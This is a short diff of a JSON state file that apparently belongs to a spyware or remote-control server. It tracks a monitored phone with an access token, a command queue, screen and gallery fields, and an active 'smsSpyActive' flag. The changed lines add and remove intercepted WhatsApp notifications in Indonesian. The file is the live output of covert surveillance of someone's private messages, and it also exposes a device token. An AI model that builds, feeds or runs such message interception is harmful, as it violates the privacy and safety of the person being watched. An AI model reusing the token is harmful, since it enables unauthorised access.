@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178076325,
+    "lastSeen": 1777178078835,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎79 pesan dari 2 chat",
+        "time": "26/04 12:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178077628
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎Pegasus-X Room (21 pesan): ~ wanglin",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173204737
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1153 pesan dari 19 chat",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173199896
       }
     ],
     "galleryPhotos": [],
